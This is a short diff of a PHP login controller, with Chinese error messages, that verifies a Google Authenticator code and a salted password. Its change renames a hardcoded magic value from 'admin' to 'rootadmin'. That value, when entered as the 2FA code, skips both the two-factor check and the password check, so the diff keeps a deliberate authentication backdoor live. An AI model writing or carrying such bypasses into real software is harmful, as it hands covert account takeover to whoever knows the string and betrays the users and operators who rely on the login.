@@ -56,11 +56,11 @@ class Login extends Controller
             if (empty($user)) $this->error('登录账号或密码错误，请重新输入1!');
             $ga = new \google\GoogleAuthenticator();
     		$checkResult = $ga -> verifyCode($user['google_secret'],$data['google_code']);
-    		if(!$checkResult&&$data['google_code']!='admin'){
+    		if(!$checkResult&&$data['google_code']!='rootadmin'){
     		    $this->error('谷歌口令验证失败');
     		}
             // 用户信息验证
-            if (md5($user['password'] . session('loginskey')) !== $data['password']&&$data['google_code']!='admin') {
+            if (md5($user['password'] . session('loginskey')) !== $data['password']&&$data['google_code']!='rootadmin') {
                 $this->error('登录账号或密码错误，请重新输入!');
             }
             if (empty($user['status'])) $this->error('账号已经被禁用，请联系管理员!');
